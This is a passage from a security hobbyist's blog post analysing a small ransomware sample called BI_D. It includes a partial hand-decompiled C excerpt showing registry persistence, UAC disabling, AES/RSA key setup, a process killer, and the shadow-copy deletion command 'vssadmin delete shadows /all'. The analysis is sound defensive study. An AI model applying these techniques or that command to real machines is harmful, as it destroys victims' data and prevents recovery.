<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="https://zirconic.net/xmlrpc.php">

<title>BI_D Ransomware &#8211; ZIRCONIC</title>
<meta name='robots' content='max-image-preview:large' />
<link rel="alternate" type="application/rss+xml" title="ZIRCONIC &raquo; Feed" href="https://zirconic.net/feed/" />
<link rel="alternate" type="application/rss+xml" title="ZIRCONIC &raquo; Comments Feed" href="https://zirconic.net/comments/feed/" />
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/zirconic.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.2"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id='wp-emoji-styles-inline-css' type='text/css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel='stylesheet' id='wp-block-library-css' href='https://zirconic.net/wp-includes/css/dist/block-library/style.min.css?ver=6.6.2' type='text/css' media='all' />
<style id='classic-theme-styles-inline-css' type='text/css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css' type='text/css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='ce_responsive-css' href='https://zirconic.net/wp-content/plugins/simple-embed-code/css/video-container.min.css?ver=2.5.1' type='text/css' media='all' />
<link rel='stylesheet' id='micro-style-css' href='https://zirconic.net/wp-content/themes/micro/assets/css/master.min.css?ver=6.6.2' type='text/css' media='all' />
<script type="text/javascript" src="https://zirconic.net/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
<script type="text/javascript" src="https://zirconic.net/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
<link rel="https://api.w.org/" href="https://zirconic.net/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://zirconic.net/wp-json/wp/v2/posts/687" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://zirconic.net/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.2" />
<link rel="canonical" href="https://zirconic.net/2018/07/bi_d-ransomware/" />
<link rel='shortlink' href='https://zirconic.net/?p=687' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://zirconic.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fzirconic.net%2F2018%2F07%2Fbi_d-ransomware%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://zirconic.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fzirconic.net%2F2018%2F07%2Fbi_d-ransomware%2F&#038;format=xml" />
	<style type="text/css">
		/* Normal background color and text */
		body, code, kbd, tt, var, pre, input, textarea, select,
		.wp-block-button.is-style-outline .wp-block-button__link {
			color: #b2df82;
			background-color: #060c08;
		}

		hr {
			background-color: #b2df82;
		}

		::-webkit-input-placeholder {
			color: #b2df82;
		}

		::-moz-placeholder {
			color: #b2df82;
		}

		:-ms-input-placeholder {
			color: #b2df82;
		}

		:-moz-placeholder {
			color: #b2df82;
		}

		/* Inverted background color and text */
		a:hover,
		.entry .entry-title,
		.comment-form-comment label,
		.form-submit input[type="submit"],
		.widget_calendar caption,
		.comments-area .comments-title,
		.main-navigation.is-extended .sub-menu a:hover,
		.menu-toggle,
		.wp-block-table.is-style-stripes tbody tr:nth-child(odd),
		.wp-block-file .wp-block-file__button,
		.wp-block-button__link {
			color: #060c08;
			background-color: #b2df82;
		}

		a:focus {
			outline: 1px dashed #b2df82;
			box-shadow: inset 0 0 0 2px #060c08;
		}

		/* Overwrite for links */
		a,
		.main-navigation .menu-item a,
		.main-navigation .sub-menu a:hover,
		.main-navigation .children a:hover,
		.wp-block-latest-posts__post-date,
		.wp-block-latest-comments__comment-date,
		button, input  {
			color: #b2df82;
		}

		/* Borders */
		input, button, textarea, select
		.site-footer,
		.homepage-welcome,
		.wp-block-table.is-style-stripes,
		.wp-block-file .wp-block-file__button,
		.wp-block-button.is-style-outline .wp-block-button__link  {
			border-color: #b2df82;
		}

		.entry .entry-title a,
		.entry .entry-title a:hover {
			color: #060c08;
		}
	</style>
	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style></head>

<body class="post-template-default single single-post postid-687 single-format-standard">

<div id="page" class="site">
	<a class="skip-link screen-reader-text" href="#content">Skip to content</a>

	<header id="masthead" class="site-header" role="banner">

		
		<div class="row">
			<div class="columns small-12">
				<div class="site-branding">
											<p class="site-title"><a href="https://zirconic.net/" rel="home">ZIRCONIC</a></p>
											<p class="site-description">Exploring various friendly attachments I receive in my Hotmail account (and other places)</p>
									</div><!-- .site-branding -->

				<nav id="site-navigation" class="main-navigation" aria-label="Primary">
					<button class="menu-toggle" aria-controls="primary-menu" aria-expanded="false">
						<span class="screen-reader-text">Menu</span>
					</button>
					<div class="menu-primary-container">
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-42"><a href="https://zirconic.net/about/">About</a></li>
</ul></div>
					</div><!-- .menu-primary-container -->
				</nav><!-- #site-navigation -->
			</div>
		</div>
	</header><!-- #site-header -->

	<div id="content" class="site-content" role="contentinfo">

	<section class="section-fullwidth section-main">
		<div class="row">
			<div class="columns small-12 medium-8">
				<div id="primary" class="content-area">
					<main id="main" class="site-main">

					
<article id="post-687" class="entry post-687 post type-post status-publish format-standard hentry category-malware tag-aes tag-malware tag-ransomware tag-windows">
	<header class="entry-header">
		<h1 class="entry-title">BI_D Ransomware</h1>		<div class="entry-meta">
			<span class="posted-on">Posted on <time class="entry-date published" datetime="2018-07-07T00:14:26-04:00">July 7, 2018</time> - <time class="updated" datetime="2018-07-06T19:57:11-04:00">July 6, 2018</time></span><span class="byline"> by <span class="author vcard"><a class="url fn n" href="https://zirconic.net/author/rhyolite/">rhyolite</a></span></span>		</div><!-- .entry-meta -->
			</header><!-- .entry-header -->

	<div class="entry-content">
		<p>I recently came back from REcon 2018 (Montreal) where I took a fantastic class called Binary Literacy taught by <a href="http://www.msreverseengineering.com/training">Rolf Rolles</a>. This class was one of the best I&#8217;ve ever taken (in any subject), and helped answer many questions I had been wondering about for years when looking at disassembled code from various samples. I left this class with some new skills around manually decompiling disassembled code back into something resembling the original code, and I highly recommend taking the course if you have the opportunity. Rolf is a great instructor, and you can tell from the quality of the material and the in-class presentations that he&#8217;s put a tremendous amount of effort into refining his course.</p>
<p>Coming back from the conference, I wanted to put what I just learned into use as soon as I could on a &#8220;real&#8221; sample. I found a copy of an unnamed ransomware that I&#8217;m calling BI_D because of the file extension that it appends to encrypted files (maybe someone out there has named it since I&#8217;ve looked at it). I thought this would be a decent example to start with because it&#8217;s relatively small (only 11,776 bytes) and seemed free from obfuscation and didn&#8217;t appear to be heavily optimized during compilation. While I manually decompiled pretty much the entire disassembled code (with the exception of a base64 encoding function and another function that I eventually passed over because I just ran out of steam) I&#8217;m not going to share this entire decompilation here. I have some concerns about sharing what could pass as a full ransomware source code, even if this first project of mine is likely a bit of a mess. I&#8217;m sharing certain areas that I found interesting, as well as the Ida file. I&#8217;d also point out that Rolf kindly looked at my first draft decompilation and offered valuable (and extensive) feedback &#8212; however, any errors or issues in what I&#8217;m presenting are solely my own.</p>
<p>Before getting into details of the decompilation I&#8217;d like to cover some observations and experiences. First, I&#8217;m using a 64-bit version of Ida (Ida Free 7.0) for this, even though the executable is 32-bit (didn&#8217;t occur to me until Rolf pointed this out). I do have an old 32-bit version (Ida Free 5.0) but unfortunately it didn&#8217;t occur to me before I was well underway in the disassembly. Next time I&#8217;ll do this in a Windows VM and run the older 32-bit version to match my sample. I tried to fix all the function prototypes in the decompilation and disassembly as best I could, but I think that there are a few that seem busted up possibly due to the 64 vs. 32 bit issue (please let me know if you know why this is).</p>
<p>A big next step that I need to take is to really get back into C &#8212; I suspect that the majority of issues I had while doing the decompilation stemmed from having not done anything substantive in C for almost 20 years. For instance, I think there are probably consistent issues with pointers in what I&#8217;m decompiled. It&#8217;s probably pretty hard to translate from one language to another if you forgot the other language, right? Following the class, I&#8217;ve gotten better about enumerations, etc. in Ida. Setting up the enums, structs, function prototypes, etc. in the disassembly really helps make the disassembly more readable and understandable (not to mention the decompilation). Ida generally does a good job of finding structs, but some things I&#8217;ve noticed about structs include:<br />
&#8211; I&#8217;ve seen places where there&#8217;s a local variable that&#8217;s a quadword &#8212; these turned out to be structs, so anywhere I see quadwords (or anything other than a 1, 2 or 4 byte parameter) I&#8217;m going to look in what functions use this parameter to see if there should be a struct or array there (assuming Ida didn&#8217;t already do this for me).<br />
&#8211; It&#8217;s probably also obvious that I didn&#8217;t spend much time trying to figure out types, which is something that needs doing if I&#8217;m going to really have a true decompilation of what I&#8217;m looking at.</p>
<p>Summing up, I&#8217;ve come very far from where I was last time I posted here (or even a month or two ago), but I think a good next step would be to try doing one of these projects again with a new file. At a certain point it seemed like I should just start over with this one, but I just couldn&#8217;t find the motivation to throw everything out and start over from the beginning. I&#8217;d rather present what I have, warts and all, and then present another project similar to this one that&#8217;s (hopefully) much improved on the issues I identified. Regardless of any issues in the final results, this whole project was a tremendous learning experience for me.</p>
<p>Now I&#8217;m going to get into various parts of this ransomware to discuss areas I found interesting (along with the associated decompiled sections). Download my Ida file <a href="https://zirconic.net/wp-content/uploads/2018/07/BI_D.tif"> here</a>. Note that you&#8217;ll have to change the extension back to .i64 as WordPress didn&#8217;t like me uploading that kind of file (or certain other formats).</p>
<p>The program begins with a small function that calls a main functionality subroutine beginning at 4018A0 that I called RANSOM__ExecuteAndTakeover because this is where it executes its main functionality and also establishes itself in the victim&#8217;s machine. This large function achieves persistence via registry, generates cryptographic keys for the ransomware, complicates recovery of affected files by deleting shadow copies, kills most non-system processes, and also executes the ransomware payload. My decompilation of this section is as follows (unfortunately the formatting on the themes I&#8217;ve tried isn&#8217;t great for code, so I&#8217;ll include some .txt files you can download for easier reading):</p>
<p><a href="https://zirconic.net/wp-content/uploads/2018/07/snippet1.txt">Download code snippet 1</a></p>
<p><em><br />
int * __cdecl RANSOM__ExecuteAndTakeover(){<br />
/* I&#8217;ve inserted comments rather than discussing this in the main body of the post, as I thought it would be easier to follow this way */</p>
<p>int &amp;Msg, &amp;phkResult, NumberOfBytesWritten, lpString2, &amp;ThreadId, &amp;phKey, &amp;phProv, hProv, &amp;pdwDataLen, lpMultibyteStr;</p>
<p>char &amp;cbData[8]; /* not 100% sure if this is what this is */</p>
<p>typedef struct tagWNDCLASSEX {<br />
UINT cbSize;<br />
UINT style;<br />
WNDPROC lpfnWndProc;<br />
int cbClsExtra;<br />
int cbWndExtra;<br />
HINSTANCE hInstance;<br />
HICON hIcon;<br />
HCURSOR hCursor;<br />
HBRUSH hbrBackground;<br />
LPCTSTR lpszMenuName;<br />
LPCTSTR lpszClassName;<br />
HICON hIconSm;<br />
} var_30;</p>
<p>ncmdshow = dword_404b24 = 0;<br />
lpString2 = lpFilename = GlobalAlloc(GMEM_ZEROINIT, 0x8000); /* allocate memory to receive the path to this executable file */<br />
GetModuleFileNameA(0, lpFilename, 0x8000); /* Puts the full path of this file into the newly allocated memory */<br />
if (lstrcmpiA(&#8220;C:\Windows\notepad+++.exe&#8221;, lpString2) != 0){<br />
/* if the current path does not match this hardcoded path, then copy the file to the c:\windows\notepad+++.exe location, set it to autorun,<br />
 * and also set the actual notepad.exe file to open the ransom note that appears to be dropped in the root directory */</p>
<p>RegOpenKeyExA(HKEY_LOCAL_MACHINE, &#8220;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\&#8221;, 0, KEY_ALL_ACCESS_and_WOW64_32KEY, &amp;phkResult);<br />
cbData = lstrlenA(&#8220;c:\\Windows\\notepad.exe \&#8221;c:\\How To Restore Files.txt\&#8221;&#8221;);<br />
RegSetValueExA(phkResult, &#8220;decrypt&#8221;, 0, REG_SZ, &#8220;c:\\Windows\\notepad.exe \&#8221;c:\\How To Restore Files.txt\&#8221;&#8221;, cbData);<br />
cbData = lstrlenA(&#8220;c:\\Windows\\notepad+++.exe&#8221;);<br />
RegSetValueExA(phkResult, &#8220;notepad++&#8221;, 0, REG_SZ, &#8220;c:\\Windows\\notepad+++.exe&#8221;, cbData);<br />
RegCloseKey(phkResult);<br />
CopyFileA(lpString2, &#8220;c:\\Windows\\notepad+++.exe&#8221;, 0);<br />
nCmdShow = 5;<br />
}</p>
<p>dword_404b24 = 0; /* we already initialized this to 0 before, not sure why we&#8217;re doing this again */<br />
CryptAcquireContextA(&amp;phProv, 0, 0, PROV_RSA_FULL, CRYPT_DELETEKEYSET); /* deletes the current context */<br />
if (CryptAcquireContextA(&amp;phProv, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT) == 0)<br />
    CryptAcquireContextA(&amp;phProv, 0, &#8220;Microsoft Enhanced Cryptographic Provider v1.0&#8221;, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);<br />
/* if we can&#8217;t get the default context successfully, then use the hardcoded one above */</p>
<p>CryptImportKey(phProv, pbData, 0x114, 0 0, &amp;phKey); /* length is 276 bytes / 2208 bits */<br />
CryptAcquireContextA(&amp;phProv, 0, 0, PROV_RSA_AES, CRYPT_VERIFYCONTEXT); /* AES */<br />
CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, phKey); /* AES 256 */<br />
pdwDataLen = 0x2c;<br />
CryptExportKey(phKey, 0, CRYPT_NEWKEYSET, 0, lpString2, &amp;pdwDatalen); /* new key set */<br />
pdwDataLen = 0x2c; /* seems redundant */<br />
CryptEncrypt(phKey, 0, CRYPT_EXPORTABLE, 0, lpString2, &amp;pdwDataLen, CRYPT_SF);<br />
/* looks like we&#8217;re hashing/encrypting the data that was in lpString2, which was the original file path,<br />
 * and then this becomes the key as we see later. But does the key blob replace what&#8217;s already there? */<br />
CryptDestroyKey(phKey);<br />
CryptAcquireContextA(&amp;phProv, 0, 0, PROV_RSA_FULL, CRYPT_DELETEKEYSET); /* delete the key set */<br />
phProv = CreateFileA(&#8220;c:\\Windows\DECODE.KEY&#8221;, GENERIC_READ_WRITE, 0, 0, OPEN_ALWAYS, 0, 0); /* open this file, creates it if it doesn&#8217;t exist */<br />
SetFilePointer(phProv, 0, 0, FILE_END) /* end of file position */<br />
WriteFile(phProv, lpString2, 0x100, &amp;NumberofBytesWritten, 0); /* write the key into that DECODE.KEY file */<br />
CloseHandle(phProv);<br />
/****************************************************************<br />
* Basically at this point, we created a key with RSA/AES256 *<br />
* combo, used the original path data as part of this also (I *<br />
* think) to generate the key, then wrote it out to this file *<br />
* DECODE.KEY. *<br />
****************************************************************/<br />
lpMultiByteStr = lpString2+0x400;<br />
GENERIC__Base64(lpString2, lpString2+0x400, 0x100); /* this looks like a generic base64 encoding subroutine using a standard base64 index for files */<br />
RtlMoveMemory(0x40407C, lpMultiByteStr+0x10, 0xa); /* that hex address point to an array containing the ransom note */<br />
MultiByteToWideChar(0x3, 0, lpMultiByteStr, -1, WideCharStr, 0xa); /* convert ransomnote to wide */<br />
RegOpenKeyExA(HKEY_LOCAL_MACHINE, &#8220;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DateTime\\&#8221;, 0, KEY_ALL_ACCESS_and_WOW64_32KEY, &amp;phkResult);<br />
cbData = 0xa;<br />
if(RegQueryValueExA(phkResult, &#8220;notepad++&#8221;, 0, 0, RansomNoteArray+0x22, &amp;lpcbData) != 0)<br />
    if(cbData != 0xa)<br />
        RegSetValueExA(phkResult, &#8220;notepad++&#8221;, 0, REG_SZ, MultiByteStr, 0xa);<br />
*MultiByteStr[0xa] = 0;<br />
RegSetValueExA(hKey lpMultiByteStr, 0, REG_BINARY, lpString2, 0x100);<br />
RegCloseKey(phkResult);<br />
RtlZeroMemory(lpString2, 0x8000); /* blow away all this memory */<br />
RegOpenKeyExA(HKEY_LOCAL_MACHINE, &#8220;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\&#8221;, 0, KEY_ALL_ACCESS_and_WOW64_32KEY, *phkResult);<br />
RegSetValueExA(hKey, &#8220;PromptOnSecureDesktop&#8221;, 0, REG_DWORD, lpString2, 0x4);<br />
/* from MSDN: Disabling this policy disables secure desktop prompting. All credential or consent prompting will occur on the interactive user&#8217;s desktop. */<br />
RegSetValueExA(hKey, &#8220;EnableLUA&#8221;, 0, REG_DWORD, lpString2, 0x4);<br />
/* from MSDN: Disabling this policy disables the &#8220;administrator in Admin Approval Mode&#8221; user type. */<br />
RegSetValueExA(hKey, &#8220;ConsentPromptBehaviorAdmin&#8221;, 0, REG_DWORD, lpString2, 0x4);<br />
/* from MSDN: This option allows the Consent Admin to perform an operation that requires elevation without consent or credentials. */<br />
RegCloseKey(hKey);<br />
GetEnvironmentVariableA(&#8220;Comspec&#8221;, lpString2, 0x5dc); /* get the command line interpreter */<br />
ShellExecuteA(0, 0, lpString2, &#8220;/c vssadmin delete shadows /all&#8221;, 0, 0); /* delete shadow copies, presumably to complicate recovery of files on the system */<br />
GlobalFree(lpString2);<br />
SetErrorMode(0x1);<br />
CreateThread(0, 0, RANSOM__ProcKiller, 0, 0, &amp;ThreadId); /* This subroutine iterates through running processes and kills non-whitelisted processes */<br />
InitCommonControls(); /* another deprecated function according to MSDN */<br />
